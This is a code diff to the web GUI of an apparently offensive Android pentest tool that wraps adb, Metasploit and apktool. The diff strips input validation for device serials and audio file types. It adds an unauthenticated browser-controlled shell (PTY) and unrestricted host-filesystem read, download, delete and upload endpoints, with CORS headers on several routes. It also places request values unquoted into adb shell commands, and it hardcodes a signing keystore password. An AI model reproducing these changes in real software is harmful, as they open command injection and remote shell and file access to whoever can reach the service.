@@ -6,14 +6,12 @@ Full-featured web GUI for all android pentest operations.
 Launched via android_pentest: set mode gui; run
 Standalone: python3 android_gui.py [--port 8897] [--serial <device>]
 """
-import argparse, json, os, queue, re, shutil, struct, subprocess, sys
+import argparse, json, os, pty, queue, re, select, shutil, struct, subprocess, sys
 import socketserver, threading, time, webbrowser
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from pathlib import Path
 from typing import Optional
 from urllib.parse import urlparse, parse_qs
-
-_SERIAL_RE = re.compile(r"^[A-Za-z0-9._:-]{1,128}$")
 
 # ── Globals ────────────────────────────────────────────────────────────────────
 _GUI_PORT    = 8897
@@ -51,6 +49,14 @@ _msf_clients: list = []          # SSE queues for MSF output
 _msf_lock     = threading.Lock()
 _msf_out_buf: list = []          # last 500 lines of MSF output
 
+# PTY shell state
+_pty_fd:      Optional[int]    = None
+_pty_pid:     Optional[int]    = None
+_pty_clients: list             = []
+_pty_lock                      = threading.Lock()
+_pty_buf:     list             = []   # rolling 500-chunk output buffer
+_pty_session: int              = 0    # incremented each new PTY start
+
 # ── Broadcast helpers ──────────────────────────────────────────────────────────
 
 def _broadcast(line: str):
@@ -63,6 +69,57 @@ def _broadcast(line: str):
                 dead.append(q)
         for q in dead:
             _sse_clients.remove(q)
+
+
+def _resize_pty(fd: int, rows: int, cols: int):
+    import fcntl, termios
+    s = struct.pack("HHHH", rows, cols, 0, 0)
+    try:
+        fcntl.ioctl(fd, termios.TIOCSWINSZ, s)
+    except Exception:
+        pass
+
+
+def _broadcast_pty(chunk: str):
+    with _pty_lock:
+        _pty_buf.append(chunk)
+        if len(_pty_buf) > 500:
+            _pty_buf.pop(0)
+        dead = []
+        for q in _pty_clients:
+            try:
+                q.put_nowait(chunk)
+            except queue.Full:
+                dead.append(q)
+        for q in dead:
+            _pty_clients.remove(q)
+
+
+def _pty_reader():
+    """Background thread — reads PTY fd and broadcasts to SSE clients."""
+    global _pty_pid, _pty_fd
+    while True:
+        with _pty_lock:
+            fd = _pty_fd
+        if fd is None:
+            break
+        try:
+            r, _, _ = select.select([fd], [], [], 0.05)
+            if r:
+                data = os.read(fd, 4096)
+                if not data:
+                    break
+                _broadcast_pty(data.decode("utf-8", errors="replace"))
+        except OSError:
+            break
+    with _pty_lock:
+        pid = _pty_pid
+        _pty_pid = None
+        _pty_fd  = None
+    if pid:
+        try: os.waitpid(pid, os.WNOHANG)
+        except Exception: pass
+    _broadcast_pty("\r\n\x1b[33m[shell exited]\x1b[0m\r\n")
 
 
 def _run_session(sid: int, context: dict):
@@ -203,12 +260,20 @@ class _Handler(BaseHTTPRequestHandler):
         elif p == "/api/media/mic/chunk":      self._api_mic_chunk()
         elif p == "/api/msf/stream":           self._api_msf_sse()
         elif p == "/api/msf/sessions":         self._api_msf_sessions()
+        elif p == "/api/pty/stream":           self._api_pty_stream()
         elif p == "/api/proc/stream":          self._api_proc_stream()
         elif p == "/api/proc/list":            self._api_proc_list()
+        elif p == "/api/fs/list":             self._api_fs_list()
+        elif p == "/api/fs/read":             self._api_fs_read()
+        elif p == "/api/fs/download":         self._api_fs_download()
+        elif p == "/api/device/fs/list":      self._api_device_fs_list()
+        elif p == "/api/device/apk/list":     self._api_device_apk_list()
         else:                                  self._send(404, "text/plain", b"not found")
 
     def do_POST(self):
         p = urlparse(self.path).path
+        if p == "/api/fs/upload":
+            self._api_fs_upload(self._read_body_raw()); return
         body = self._read_body()
         if   p == "/api/run":               self._api_run(body)
         elif p == "/api/kill":              self._api_kill()
@@ -220,6 +285,18 @@ class _Handler(BaseHTTPRequestHandler):
         elif p == "/api/msf/start":         self._api_msf_start(body)
         elif p == "/api/msf/stop":          self._api_msf_stop()
         elif p == "/api/msf/send":          self._api_msf_send(body)
+        elif p == "/api/pty/start":         self._api_pty_start(body)
+        elif p == "/api/pty/input":         self._api_pty_input(body)
+        elif p == "/api/pty/resize":        self._api_pty_resize(body)
+        elif p == "/api/pty/kill":          self._api_pty_kill()
+        elif p == "/api/fs/delete":         self._api_fs_delete(body)
+        elif p == "/api/fs/rename":         self._api_fs_rename(body)
+        elif p == "/api/fs/mkdir":          self._api_fs_mkdir(body)
+        elif p == "/api/device/fs/pull":    self._api_device_fs_pull(body)
+        elif p == "/api/device/fs/push":    self._api_device_fs_push(body)
+        elif p == "/api/device/apk/pull":   self._api_device_apk_pull(body)
+        elif p == "/api/apk/decompile":     self._api_apk_decompile(body)
+        elif p == "/api/apk/recompile":     self._api_apk_recompile(body)
         else:                               self._send(404, "text/plain", b"not found")
 
     def do_OPTIONS(self):
@@ -251,11 +328,9 @@ class _Handler(BaseHTTPRequestHandler):
         try:    return json.loads(raw)
         except: return {}
 
-    def _validated_serial(self, raw: str) -> Optional[str]:
-        serial = (raw or "").strip()
-        if not serial:
-            return ""
-        return serial if _SERIAL_RE.fullmatch(serial) else None
+    def _read_body_raw(self) -> bytes:
+        length = int(self.headers.get("Content-Length", 0))
+        return self.rfile.read(length) if length else b""
 
     # ── endpoints ─────────────────────────────────────────────────────────────
 
@@ -571,13 +646,9 @@ class _Handler(BaseHTTPRequestHandler):
     def _api_speaker(self, body: dict):
         """Push a base64-encoded audio file to the device and play it."""
         import base64
-        serial  = str(body.get("device", "")).strip()
-        if serial and not re.fullmatch(r"[A-Za-z0-9._:-]+", serial):
-            self._json({"ok": False, "error": "invalid device serial"}); return
+        serial  = body.get("device", "")
         b64     = body.get("data", "")
-        ext     = str(body.get("ext", "mp3")).strip().lower()
-        if ext not in {"mp3", "wav"}:
-            self._json({"ok": False, "error": "invalid audio extension"}); return
+        ext     = body.get("ext", "mp3")
         prefix  = (["-s", serial] if serial else [])
         adb     = shutil.which("adb") or "adb"
         if not b64:
@@ -615,6 +686,8 @@ class _Handler(BaseHTTPRequestHandler):
             global _msf_proc
             for raw in iter(_msf_proc.stdout.readline, b""):
                 line = raw.decode(errors="replace").rstrip("\n")
+                if line.startswith("stty:"):           # suppress terminal noise
+                    continue
                 with _msf_lock:
                     _msf_out_buf.append(line)
                     if len(_msf_out_buf) > 500:
@@ -623,16 +696,22 @@ class _Handler(BaseHTTPRequestHandler):
                         try: q.put_nowait(line)
                         except queue.Full: pass
 
+        env = os.environ.copy()
+        env["TERM"] = "xterm-256color"
         _msf_proc = subprocess.Popen(
             [msfc, "-q"],
             stdin=subprocess.PIPE, stdout=subprocess.PIPE,
-            stderr=subprocess.STDOUT)
+            stderr=subprocess.STDOUT, env=env)
         threading.Thread(target=_reader, daemon=True).start()
         if init_cmd:
-            time.sleep(2)
+            time.sleep(2.5)
             try:
-                _msf_proc.stdin.write((init_cmd + "\n").encode())
-                _msf_proc.stdin.flush()
+                for cmd in init_cmd.split(";"):
+                    cmd = cmd.strip()
+                    if cmd:
+                        _msf_proc.stdin.write((cmd + "\n").encode())
+                        _msf_proc.stdin.flush()
+                        time.sleep(0.12)
             except Exception: pass
         self._json({"ok": True})
 
@@ -693,16 +772,125 @@ class _Handler(BaseHTTPRequestHandler):
                 sessions.append(line.strip())
         self._json({"sessions": sessions, "running": bool(_msf_proc and _msf_proc.poll() is None)})
 
+    # ── PTY shell ─────────────────────────────────────────────────────────────
+
+    def _api_pty_start(self, body: dict):
+        global _pty_fd, _pty_pid, _pty_session
+        with _pty_lock:
+            # kill stale PTY
+            if _pty_pid:
+                try:
+                    os.kill(_pty_pid, 9)
+                except Exception:
+                    pass
+                _pty_pid = None
+                if _pty_fd is not None:
+                    try: os.close(_pty_fd)
+                    except Exception: pass
+                    _pty_fd = None
+            _pty_session += 1
+            _pty_buf.clear()
+
+        cols = int(body.get("cols", 220))
+        rows = int(body.get("rows", 40))
+        shell = shutil.which("zsh") or shutil.which("bash") or "/bin/sh"
+
+        pid, fd = pty.fork()
+        if pid == 0:
+            # child — set TERM and exec shell
+            os.environ["TERM"]  = "xterm-256color"
+            os.environ["LINES"] = str(rows)
+            os.environ["COLUMNS"] = str(cols)
+            os.execlp(shell, shell)
+        else:
+            # parent
+            import fcntl, termios as _t
+            _resize_pty(fd, rows, cols)
+            with _pty_lock:
+                _pty_fd  = fd
+                _pty_pid = pid
+            threading.Thread(target=_pty_reader, daemon=True).start()
+            self._json({"ok": True, "pid": pid, "shell": shell})
+
+    def _api_pty_input(self, body: dict):
+        text = body.get("text", "")
+        with _pty_lock:
+            fd = _pty_fd
+        if fd is None:
+            self._json({"ok": False, "error": "no PTY"}); return
+        try:
+            os.write(fd, text.encode("utf-8", errors="replace"))
+            self._json({"ok": True})
+        except OSError as e:
+            self._json({"ok": False, "error": str(e)})
+
+    def _api_pty_resize(self, body: dict):
+        rows = int(body.get("rows", 24))
+        cols = int(body.get("cols", 80))
+        with _pty_lock:
+            fd = _pty_fd
+        if fd is not None:
+            _resize_pty(fd, rows, cols)
+        self._json({"ok": True})
+
+    def _api_pty_kill(self):
+        global _pty_pid, _pty_fd
+        with _pty_lock:
+            pid, fd = _pty_pid, _pty_fd
+            _pty_pid = None
+            _pty_fd  = None
+        if pid:
+            try: os.kill(pid, 9)
+            except Exception: pass
+        if fd is not None:
+            try: os.close(fd)
+            except Exception: pass
+        _broadcast_pty("\r\n\x1b[33m[shell killed]\x1b[0m\r\n")
+        self._json({"ok": True})
+
+    def _api_pty_stream(self):
+        """SSE stream — sends PTY output to browser."""
+        qs = parse_qs(urlparse(self.path).query)
+        client_sid = int((qs.get("sid") or ["0"])[0])
+        q: queue.Queue = queue.Queue(maxsize=2000)
+        with _pty_lock:
+            _pty_clients.append(q)
+            # send session ID handshake first
+            try: q.put_nowait(json.dumps({"pty_sid": _pty_session}))
+            except queue.Full: pass
+            # only replay buffer when client is reconnecting to same session
+            if client_sid == _pty_session:
+                for chunk in list(_pty_buf):
+                    try: q.put_nowait(chunk)
+                    except queue.Full: break
+        self.send_response(200)
+        self.send_header("Content-Type", "text/event-stream; charset=utf-8")
+        self.send_header("Cache-Control", "no-cache")
+        self._cors()
+        self.end_headers()
+        try:
+            while True:
+                try:
+                    chunk = q.get(timeout=15)
+                    escaped = json.dumps(chunk)
+                    self.wfile.write(f"data: {escaped}\n\n".encode())
+                    self.wfile.flush()
+                except queue.Empty:
+                    self.wfile.write(b": keepalive\n\n")
+                    self.wfile.flush()
+        except (BrokenPipeError, ConnectionResetError):
+            pass
+        finally:
+            with _pty_lock:
+                try: _pty_clients.remove(q)
+                except ValueError: pass
+
     # ── proc stream ───────────────────────────────────────────────────────────
 
     def _api_proc_list(self):
         """One-shot JSON process list for the current device."""
-        qs         = parse_qs(urlparse(self.path).query)
-        serial_raw = (qs.get("serial") or [""])[0]
-        serial     = self._validated_serial(serial_raw)
-        if serial is None:
-            self._send(400, "application/json", b'{"error":"invalid serial"}')
-            return
+        qs     = parse_qs(urlparse(self.path).query)
+        serial = (qs.get("serial") or [""])[0]
         filt   = (qs.get("filter") or [""])[0].lower()
         prefix = ["-s", serial] if serial else []
         out    = _adb(*prefix, "shell", "ps", "-A", "2>/dev/null")
@@ -721,12 +909,8 @@ class _Handler(BaseHTTPRequestHandler):
 
     def _api_proc_stream(self):
         """SSE stream — pushes updated process list every 2 s."""
-        qs         = parse_qs(urlparse(self.path).query)
-        serial_raw = (qs.get("serial") or [""])[0]
-        serial     = self._validated_serial(serial_raw)
-        if serial is None:
-            self._send(400, "application/json", b'{"error":"invalid serial"}')
-            return
+        qs     = parse_qs(urlparse(self.path).query)
+        serial = (qs.get("serial") or [""])[0]
         filt   = (qs.get("filter") or [""])[0].lower()
         prefix = ["-s", serial] if serial else []
         self.send_response(200)
@@ -758,12 +942,8 @@ class _Handler(BaseHTTPRequestHandler):
     # ── devinfo ────────────────────────────────────────────────────────────────
 
     def _api_devinfo(self):
-        qs         = parse_qs(urlparse(self.path).query)
-        serial_raw = (qs.get("serial") or [""])[0]
-        serial     = self._validated_serial(serial_raw)
-        if serial is None:
-            self._send(400, "application/json", b'{"error":"invalid serial"}')
-            return
+        qs     = parse_qs(urlparse(self.path).query)
+        serial = (qs.get("serial") or [""])[0]
         prefix = ["-s", serial] if serial else []
         props  = {}
         for prop in ["ro.product.model", "ro.product.brand", "ro.build.version.release",
@@ -773,12 +953,8 @@ class _Handler(BaseHTTPRequestHandler):
         self._json(props)
 
     def _api_applist(self):
-        qs         = parse_qs(urlparse(self.path).query)
-        serial_raw = (qs.get("serial") or [""])[0]
-        serial     = self._validated_serial(serial_raw)
-        if serial is None:
-            self._send(400, "application/json", b'{"error":"invalid serial"}')
-            return
+        qs       = parse_qs(urlparse(self.path).query)
+        serial   = (qs.get("serial") or [""])[0]
         prefix   = ["-s", serial] if serial else []
         out      = _adb(*prefix, "shell", "pm", "list", "packages", "-3")
         packages = sorted(l.replace("package:", "").strip() for l in out.splitlines() if l.startswith("package:"))
@@ -874,28 +1050,48 @@ class _Handler(BaseHTTPRequestHandler):
         self._json({"lhost": ip})
 
     def _api_deps(self):
+        # detect distro package manager
+        pkg_mgr = "apt"
+        for m in ("yay", "paru", "pacman", "dnf", "zypper", "brew", "apt"):
+            if shutil.which(m):
+                pkg_mgr = m
+                break
+
+        def _inst(apt="", pacman="", pip="", manual=""):
+            if pkg_mgr in ("yay", "paru") and pacman:
+                return f"{pkg_mgr} -S {pacman.split()[-1]}"
+            if pkg_mgr == "pacman" and pacman:
+                return f"pacman -S {pacman.split()[-1]}"
+            if pkg_mgr == "dnf" and apt:
+                return f"dnf install {apt.split()[-1]}"
+            if pkg_mgr in ("apt", "apt-get") and apt:
+                return f"apt install {apt}"
+            return manual or pip or pacman or apt
+
         tools = {
-            # system
-            "adb":          {"cmd": "adb", "install": "pacman -S android-tools  # or apt install adb"},
-            "apktool":      {"cmd": "apktool", "install": "pacman -S apktool  # or apt install apktool"},
-            "aapt2":        {"cmd": "aapt2", "install": "included with Android SDK build-tools"},
-            "aapt":         {"cmd": "aapt", "install": "pacman -S android-tools"},
-            "jadx":         {"cmd": "jadx", "install": "pacman -S jadx  # or apt install jadx"},
-            "keytool":      {"cmd": "keytool", "install": "apt install default-jdk"},
-            "msfvenom":     {"cmd": "msfvenom", "install": "apt install metasploit-framework"},
-            "msfconsole":   {"cmd": "msfconsole", "install": "apt install metasploit-framework"},
-            "frida":        {"cmd": "frida", "install": "pip3 install frida-tools"},
-            "objection":    {"cmd": "objection", "install": "pip3 install objection"},
-            "bore":         {"cmd": "bore", "install": "curl -sL https://github.com/ekzhang/bore/releases/download/v0.5.1/bore-v0.5.1-x86_64-unknown-linux-musl.tar.gz | tar xz -C ~/.local/bin"},
-            "cloudflared":  {"cmd": "cloudflared", "install": "apt install cloudflared"},
-            "nmap":         {"cmd": "nmap", "install": "pacman -S nmap  # or apt install nmap"},
-            "qrencode":     {"cmd": "qrencode", "install": "apt install qrencode"},
-            # python
-            "paramiko":     {"cmd": None, "pymod": "paramiko", "install": "pip3 install paramiko"},
-            "requests":     {"cmd": None, "pymod": "requests", "install": "pip3 install requests"},
-            "qrcode":       {"cmd": None, "pymod": "qrcode", "install": "pip3 install qrcode[pil]"},
-            "cryptography": {"cmd": None, "pymod": "cryptography", "install": "pip3 install cryptography"},
-            "frida-py":     {"cmd": None, "pymod": "frida", "install": "pip3 install frida"},
+            # system tools
+            "adb":         {"cmd":"adb",        "install":_inst(apt="adb",         pacman="android-tools")},
+            "apktool":     {"cmd":"apktool",     "install":_inst(apt="apktool",     pacman="apktool")},
+            "aapt2":       {"cmd":"aapt2",       "install":_inst(manual="via Android SDK build-tools")},
+            "aapt":        {"cmd":"aapt",        "install":_inst(apt="aapt",        pacman="android-tools")},
+            "jadx":        {"cmd":"jadx",        "install":_inst(apt="jadx",        pacman="jadx")},
+            "keytool":     {"cmd":"keytool",     "install":_inst(apt="default-jdk", pacman="jdk-openjdk")},
+            "msfvenom":    {"cmd":"msfvenom",    "install":_inst(apt="metasploit-framework", manual="yay -S metasploit  # Arch AUR")},
+            "msfconsole":  {"cmd":"msfconsole",  "install":_inst(apt="metasploit-framework", manual="yay -S metasploit  # Arch AUR")},
+            "frida":       {"cmd":"frida",       "install":"pip3 install frida-tools"},
+            "objection":   {"cmd":"objection",   "install":"pip3 install objection"},
+            "bore":        {"cmd":"bore",        "install":_inst(pacman="bore-bin", manual="cargo install bore-cli  # or download from github.com/ekzhang/bore/releases")},
+            "cloudflared": {"cmd":"cloudflared", "install":_inst(apt="cloudflared", pacman="cloudflared")},
+            "nmap":        {"cmd":"nmap",        "install":_inst(apt="nmap",        pacman="nmap")},
+            "qrencode":    {"cmd":"qrencode",    "install":_inst(apt="qrencode",    pacman="qrencode")},
+            "ssh":         {"cmd":"ssh",         "install":_inst(apt="openssh-client", pacman="openssh")},
+            # python modules
+            "paramiko":    {"cmd":None, "pymod":"paramiko",     "install":"pip3 install paramiko"},
+            "requests":    {"cmd":None, "pymod":"requests",     "install":"pip3 install requests"},
+            "qrcode":      {"cmd":None, "pymod":"qrcode",       "install":"pip3 install qrcode[pil]"},
+            "cryptography":{"cmd":None, "pymod":"cryptography", "install":"pip3 install cryptography"},
+            "frida-py":    {"cmd":None, "pymod":"frida",        "install":"pip3 install frida"},
+            "PIL":         {"cmd":None, "pymod":"PIL",          "install":"pip3 install Pillow"},
         }
         result = {}
         for name, info in tools.items():
@@ -908,7 +1104,317 @@ class _Handler(BaseHTTPRequestHandler):
                 except ImportError:
                     ok = False
             result[name] = {"ok": ok, "install": info["install"]}
-        self._json({"deps": result})
+        self._json({"deps": result, "pkg_mgr": pkg_mgr})
+
+    # ── FILE MANAGER — host fs ────────────────────────────────────────────────
+
+    def _api_fs_list(self):
+        qs   = parse_qs(urlparse(self.path).query)
+        raw  = (qs.get("path") or [""])[0].strip()
+        path = Path(raw).expanduser() if raw else Path.home()
+        if not path.is_absolute():
+            path = Path.home() / path
+        if not path.exists():
+            self._json({"error": "not found", "path": str(path)}); return
+        if path.is_file():
+            st = path.stat()
+            self._json({"type": "file", "path": str(path),
+                        "size": st.st_size, "mtime": int(st.st_mtime)}); return
+        entries = []
+        try:
+            for item in sorted(path.iterdir(), key=lambda x: (x.is_file(), x.name.lower())):
+                try:
+                    st = item.stat()
+                    entries.append({
+                        "name": item.name,
+                        "path": str(item),
+                        "type": "dir" if item.is_dir() else "file",
+                        "size": st.st_size if item.is_file() else 0,
+                        "mtime": int(st.st_mtime),
+                        "ext": item.suffix.lower() if item.is_file() else "",
+                    })
+                except PermissionError:
+                    entries.append({"name": item.name, "path": str(item),
+                                    "type": "dir" if item.is_dir() else "file",
+                                    "size": 0, "mtime": 0, "ext": "", "noaccess": True})
+        except PermissionError:
+            self._json({"error": "permission denied", "path": str(path)}); return
+        parent = str(path.parent) if path != path.parent else None
+        self._json({"path": str(path), "parent": parent, "entries": entries})
+
+    def _api_fs_read(self):
+        qs   = parse_qs(urlparse(self.path).query)
+        raw  = (qs.get("path") or [""])[0].strip()
+        path = Path(raw)
+        if not path.is_file():
+            self._json({"error": "not a file"}); return
+        try:
+            size = path.stat().st_size
+            if size > 512_000:
+                self._json({"error": "file too large (>512KB) — use download instead",
+                            "size": size}); return
+            content = path.read_bytes()
+            try:
+                text = content.decode("utf-8")
+                self._json({"text": text, "size": size, "binary": False})
+            except UnicodeDecodeError:
+                import base64
+                self._json({"b64": base64.b64encode(content).decode(),
+                            "size": size, "binary": True})
+        except Exception as e:
+            self._json({"error": str(e)})
+
+    def _api_fs_download(self):
+        qs   = parse_qs(urlparse(self.path).query)
+        raw  = (qs.get("path") or [""])[0].strip()
+        path = Path(raw)
+        if not path.is_file():
+            self._send(404, "text/plain", b"not found"); return
+        try:
+            data = path.read_bytes()
+            self.send_response(200)
+            ct = "application/octet-stream"
+            if path.suffix in (".apk", ".aab"):    ct = "application/vnd.android.package-archive"
+            elif path.suffix == ".txt":              ct = "text/plain"
+            elif path.suffix in (".json", ".yml"):   ct = "application/json"
+            self.send_header("Content-Type", ct)
+            self.send_header("Content-Disposition",
+                             f'attachment; filename="{path.name}"')
+            self._cors()
+            self.send_header("Content-Length", str(len(data)))
+            self.end_headers()
+            self.wfile.write(data)
+        except Exception as e:
+            self._send(500, "text/plain", str(e).encode())
+
+    def _api_fs_delete(self, body: dict):
+        path = Path(body.get("path", ""))
+        if not path.exists():
+            self._json({"ok": False, "error": "not found"}); return
+        try:
+            if path.is_dir():
+                shutil.rmtree(str(path))
+            else:
+                path.unlink()
+            self._json({"ok": True})
+        except Exception as e:
+            self._json({"ok": False, "error": str(e)})
+
+    def _api_fs_rename(self, body: dict):
+        src = Path(body.get("src", ""))
+        dst = Path(body.get("dst", ""))
+        if not src.exists():
+            self._json({"ok": False, "error": "source not found"}); return
+        try:
+            src.rename(dst)
+            self._json({"ok": True, "path": str(dst)})
+        except Exception as e:
+            self._json({"ok": False, "error": str(e)})
+
+    def _api_fs_mkdir(self, body: dict):
+        path = Path(body.get("path", ""))
+        try:
+            path.mkdir(parents=True, exist_ok=True)
+            self._json({"ok": True, "path": str(path)})
+        except Exception as e:
+            self._json({"ok": False, "error": str(e)})
+
+    def _api_fs_upload(self, raw_bytes: bytes):
+        dest_dir = self.headers.get("X-Dest-Dir", "")
+        filename  = self.headers.get("X-Filename", "upload.bin")
+        dest_dir  = Path(dest_dir) if dest_dir else Path.home() / ".secv" / "android"
+        dest_dir.mkdir(parents=True, exist_ok=True)
+        dest = dest_dir / Path(filename).name
+        try:
+            dest.write_bytes(raw_bytes)
+            self._json({"ok": True, "path": str(dest), "size": len(raw_bytes)})
+        except Exception as e:
+            self._json({"ok": False, "error": str(e)})
+
+    # ── FILE MANAGER — device fs ──────────────────────────────────────────────
+
+    def _api_device_fs_list(self):
+        qs     = parse_qs(urlparse(self.path).query)
+        serial = (qs.get("serial") or [""])[0]
+        path   = (qs.get("path") or ["/sdcard"])[0]
+        prefix = (["-s", serial] if serial else [])
+        out    = _adb(*prefix, "shell", f"ls -la '{path}' 2>&1")
+        entries = []
+        for line in out.splitlines():
+            if line.startswith("total") or not line.strip():
+                continue
+            parts = line.split(None, 7)
+            if len(parts) < 7:
+                continue
+            perms = parts[0]
+            size  = parts[4] if len(parts) > 4 else "0"
+            name  = parts[-1].strip() if len(parts) >= 7 else "?"
+            if name in (".", ".."):
+                continue
+            is_dir = perms.startswith("d") or perms.startswith("l")
+            entries.append({
+                "name": name,
+                "path": path.rstrip("/") + "/" + name,
+                "type": "dir" if is_dir else "file",
+                "perms": perms,
+                "size": size,
+            })
+        parent = "/".join(path.rstrip("/").split("/")[:-1]) or "/"
+        self._json({"path": path, "parent": parent if path != "/" else None,
+                    "entries": entries, "error": out if not entries and out.strip() else None})
+
+    def _api_device_fs_pull(self, body: dict):
+        serial  = body.get("serial", "")
+        remote  = body.get("remote", "")
+        local   = body.get("local", "")
+        if not remote:
+            self._json({"ok": False, "error": "remote path required"}); return
+        prefix  = (["-s", serial] if serial else [])
+        if not local:
+            dest_dir = Path.home() / ".secv" / "android" / "pulled"
+            dest_dir.mkdir(parents=True, exist_ok=True)
+            local = str(dest_dir / Path(remote).name)
+        rc, out, err = (lambda r: (r.returncode, r.stdout.decode(errors="replace"),
+                                   r.stderr.decode(errors="replace")))(
+            subprocess.run([shutil.which("adb") or "adb"] + prefix + ["pull", remote, local],
+                           capture_output=True, timeout=120)
+        )
+        ok = rc == 0 and Path(local).exists()
+        self._json({"ok": ok, "local": local if ok else None,
+                    "output": out + err})
+
+    def _api_device_fs_push(self, body: dict):
+        serial = body.get("serial", "")
+        local  = body.get("local", "")
+        remote = body.get("remote", "")
+        if not local or not remote:
+            self._json({"ok": False, "error": "local and remote required"}); return
+        prefix = (["-s", serial] if serial else [])
+        rc, out, err = (lambda r: (r.returncode, r.stdout.decode(errors="replace"),
+                                   r.stderr.decode(errors="replace")))(
+            subprocess.run([shutil.which("adb") or "adb"] + prefix + ["push", local, remote],
+                           capture_output=True, timeout=120)
+        )
+        self._json({"ok": rc == 0, "output": out + err})
+
+    def _api_device_apk_list(self):
+        qs     = parse_qs(urlparse(self.path).query)
+        serial = (qs.get("serial") or [""])[0]
+        prefix = (["-s", serial] if serial else [])
+        out    = _adb(*prefix, "shell", "pm list packages -f 2>/dev/null")
+        apks   = []
+        for line in out.splitlines():
+            line = line.strip()
+            if not line.startswith("package:"):
+                continue
+            try:
+                rest = line[len("package:"):]
+                eq   = rest.rfind("=")
+                apk_path = rest[:eq]
+                pkg      = rest[eq+1:]
+                apks.append({"package": pkg, "apk_path": apk_path})
+            except Exception:
+                pass
+        apks.sort(key=lambda x: x["package"])
+        self._json({"apks": apks, "count": len(apks)})
+
+    def _api_device_apk_pull(self, body: dict):
+        serial  = body.get("serial", "")
+        package = body.get("package", "")
+        if not package:
+            self._json({"ok": False, "error": "package required"}); return
+        prefix = (["-s", serial] if serial else [])
+        path_out = _adb(*prefix, "shell", f"pm path {package} 2>/dev/null")
+        apk_path = None
+        for line in path_out.splitlines():
+            if line.startswith("package:"):
+                apk_path = line[8:].strip(); break
+        if not apk_path:
+            self._json({"ok": False, "error": f"cannot locate APK for {package}"}); return
+        dest_dir = Path.home() / ".secv" / "android" / "apks"
+        dest_dir.mkdir(parents=True, exist_ok=True)
+        local = str(dest_dir / f"{package}.apk")
+        rc, out, err = (lambda r: (r.returncode, r.stdout.decode(errors="replace"),
+                                   r.stderr.decode(errors="replace")))(
+            subprocess.run([shutil.which("adb") or "adb"] + prefix + ["pull", apk_path, local],
+                           capture_output=True, timeout=120)
+        )
+        if rc != 0 or not Path(local).exists():
+            tmp = f"/sdcard/secv_pull_{package}.apk"
+            _adb(*prefix, "shell", f"su -c 'cp {apk_path} {tmp}' 2>/dev/null || run-as {package} cat {apk_path} > {tmp}")
+            rc, out, err = (lambda r: (r.returncode, r.stdout.decode(errors="replace"),
+                                       r.stderr.decode(errors="replace")))(
+                subprocess.run([shutil.which("adb") or "adb"] + prefix + ["pull", tmp, local],
+                               capture_output=True, timeout=120)
+            )
+            _adb(*prefix, "shell", f"rm -f {tmp}")
+        ok = Path(local).exists()
+        self._json({"ok": ok, "local": local if ok else None,
+                    "package": package, "output": out + err})
+
+    def _api_apk_decompile(self, body: dict):
+        apk  = body.get("apk", "")
+        out  = body.get("out", "")
+        if not apk or not Path(apk).is_file():
+            self._json({"ok": False, "error": "apk not found"}); return
+        apktool = shutil.which("apktool")
+        if not apktool:
+            self._json({"ok": False, "error": "apktool not installed"}); return
+        apk_path = Path(apk)
+        if not out:
+            out = str(Path.home() / ".secv" / "android" / "decoded" / apk_path.stem)
+        try:
+            r = subprocess.run([apktool, "d", apk, "-o", out, "-f"],
+                               capture_output=True, text=True, timeout=300)
+            ok = r.returncode == 0 and Path(out).exists()
+            self._json({"ok": ok, "out_dir": out if ok else None,
+                        "stdout": r.stdout[-2000:], "stderr": r.stderr[-2000:]})
+        except Exception as e:
+            self._json({"ok": False, "error": str(e)})
+
+    def _api_apk_recompile(self, body: dict):
+        src  = body.get("src", "")
+        out  = body.get("out", "")
+        sign = body.get("sign", True)
+        if not src or not Path(src).is_dir():
+            self._json({"ok": False, "error": "decoded dir not found"}); return
+        apktool = shutil.which("apktool")
+        if not apktool:
+            self._json({"ok": False, "error": "apktool not installed"}); return
+        src_path = Path(src)
+        if not out:
+            out = str(Path.home() / ".secv" / "android" / "apks" /
+                      (src_path.name + "_recompiled.apk"))
+        try:
+            r = subprocess.run([apktool, "b", src, "-o", out],
+                               capture_output=True, text=True, timeout=300)
+            ok = r.returncode == 0 and Path(out).exists()
+            if ok and sign:
+                ks = Path.home() / ".secv" / "android" / "secv_debug.keystore"
+                if not ks.exists():
+                    subprocess.run(["keytool", "-genkeypair", "-v",
+                                    "-keystore", str(ks), "-alias", "secv",
+                                    "-keyalg", "RSA", "-keysize", "2048",
+                                    "-validity", "10000",
+                                    "-dname", "CN=secV,O=secV,C=US",
+                                    "-storepass", "secvpass", "-keypass", "secvpass"],
+                                   capture_output=True, timeout=30)
+                apksigner = shutil.which("apksigner")
+                if apksigner:
+                    subprocess.run([apksigner, "sign", "--ks", str(ks),
+                                    "--ks-pass", "pass:secvpass",
+                                    "--key-pass", "pass:secvpass", out],
+                                   capture_output=True, timeout=60)
+                else:
+                    jarsigner = shutil.which("jarsigner")
+                    if jarsigner:
+                        subprocess.run([jarsigner, "-keystore", str(ks),
+                                        "-storepass", "secvpass", out, "secv"],
+                                       capture_output=True, timeout=60)
+            self._json({"ok": ok, "out_apk": out if ok else None,
+                        "stdout": r.stdout[-2000:], "stderr": r.stderr[-2000:]})
+        except Exception as e:
+            self._json({"ok": False, "error": str(e)})
 
     def _api_workdir(self):
         base = Path.home() / ".secv" / "android"
@@ -986,7 +1492,14 @@ class _Handler(BaseHTTPRequestHandler):
 
     def _serve_html(self):
         html = _HTML.encode()
-        self._send(200, "text/html; charset=utf-8", html)
+        self.send_response(200)
+        self.send_header("Content-Type", "text/html; charset=utf-8")
+        self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
+        self.send_header("Pragma", "no-cache")
+        self._cors()
+        self.send_header("Content-Length", str(len(html)))
+        self.end_headers()
+        self.wfile.write(html)
 
 
 # ── Embedded HTML ──────────────────────────────────────────────────────────────
@@ -1000,17 +1513,59 @@ _HTML = r"""<!DOCTYPE html>
 <link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=JetBrains+Mono:ital,wght@0,300;0,400;0,500;1,300&display=swap" rel="stylesheet">
 <style>
 :root{
-  --bg:#060606;--bg1:#0e0e0e;--bg2:#161616;--bg3:#1e1e1e;--bg4:#282828;
-  --border:rgba(255,255,255,0.07);--border2:rgba(255,255,255,0.14);--border3:rgba(255,255,255,0.24);
-  --text:#a0a0a0;--muted:#4a4a4a;--white:#efefef;--off:#cccccc;--grey:#707070;
+  --bg:#060606;--bg1:rgba(14,14,14,0.92);--bg2:rgba(22,22,22,0.94);--bg3:#1e1e1e;--bg4:#282828;
